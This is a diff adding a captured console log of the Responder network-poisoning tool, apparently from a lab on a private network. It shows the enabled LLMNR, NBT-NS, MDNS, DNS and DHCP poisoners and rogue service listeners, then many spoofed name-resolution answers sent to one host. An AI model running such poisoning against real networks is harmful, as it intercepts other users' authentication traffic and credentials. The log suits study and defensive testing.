@@ -1,0 +1,88 @@
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[1;32m[+] [0mPoisoners:
+    LLMNR                      [1;32m[ON][0m
+    NBT-NS                     [1;32m[ON][0m
+    MDNS                       [1;32m[ON][0m
+    DNS                        [1;32m[ON][0m
+    DHCP                       [1;32m[ON][0m
+
+[1;32m[+] [0mServers:
+    HTTP server                [1;31m[OFF][0m
+    HTTPS server               [1;32m[ON][0m
+    WPAD proxy                 [1;32m[ON][0m
+    Auth proxy                 [1;31m[OFF][0m
+    SMB server                 [1;31m[OFF][0m
+    Kerberos server            [1;32m[ON][0m
+    SQL server                 [1;32m[ON][0m
+    FTP server                 [1;32m[ON][0m
+    IMAP server                [1;32m[ON][0m
+    POP3 server                [1;32m[ON][0m
+    SMTP server                [1;32m[ON][0m
+    DNS server                 [1;32m[ON][0m
+    LDAP server                [1;32m[ON][0m
+    MQTT server                [1;32m[ON][0m
+    RDP server                 [1;32m[ON][0m
+    DCE-RPC server             [1;32m[ON][0m
+    WinRM server               [1;32m[ON][0m
+    SNMP server                [1;32m[ON][0m
+
+[1;32m[+] [0mHTTP Options:
+    Always serving EXE         [1;31m[OFF][0m
+    Serving EXE                [1;31m[OFF][0m
+    Serving HTML               [1;31m[OFF][0m
+    Upstream Proxy             [1;31m[OFF][0m
+
+[1;32m[+] [0mPoisoning Options:
+    Analyze Mode               [1;31m[OFF][0m
+    Force WPAD auth            [1;31m[OFF][0m
+    Force Basic Auth           [1;31m[OFF][0m
+    Force LM downgrade         [1;31m[OFF][0m
+    Force ESS downgrade        [1;31m[OFF][0m
+
+[1;32m[+] [0mGeneric Options:
+    Responder NIC              [1;35m[mlan0][0m
+    Responder IP               [1;35m[192.168.31.244][0m
+    Responder IPv6             [1;35m[fe80::c29b:ca38:b5eb:2c48][0m
+    Challenge set              [1;35m[random][0m
+    Don't Respond To Names     [1;35m['ISATAP', 'ISATAP.LOCAL'][0m
+    Don't Respond To MDNS TLD  [1;35m['_DOSVC'][0m
+    TTL for poisoned response  [1;35m[default][0m
+
+[1;32m[+] [0mCurrent Session Variables:
+    Responder Machine Name     [1;35m[WIN-FL88FBR0IAP][0m
+    Responder Domain Name      [1;35m[CXQR.LOCAL][0m
+    Responder DCE-RPC Port     [1;35m[47888][0m
+
+[1;32m[*] [0mVersion: Responder 3.1.7.0
+[1;32m[*] [0mAuthor: Laurent Gaffie, <lgaffie@secorizon.com>
+[1;32m[*] [0mTo sponsor Responder: https://paypal.me/PythonResponder
+[1;32m
+[+][0m Listening for events...
+
+[1;32m[*] [NBT-NS] Poisoned answer sent to 192.168.31.151 for name DOMAIN-EXPLOIIT (service: File Server)[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.31.151  for name domain-exploiit.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.31.151  for name domain-exploiit.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.31.151 for name domain-exploiit[0m
+[1;32m[*] [NBT-NS] Poisoned answer sent to 192.168.31.151 for name DOMAIN-EXPLOIIT (service: File Server)[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.31.151 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.31.151 for name domain-exploiit[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.31.151  for name domain-exploiit.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.31.151  for name domain-exploiit.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit.local[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.31.151 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit[0m
+[1;32m[*] [LLMNR]  Poisoned answer sent to 192.168.31.151 for name domain-exploiit[0m
+[1;32m[*] [MDNS] Poisoned answer sent to 192.168.31.151  for name domain-exploiit.local[0m
+[1;32m[*] [MDNS] Poisoned answer sent to fe80::bb61:abe5:7552:b363 for name domain-exploiit.local[0m
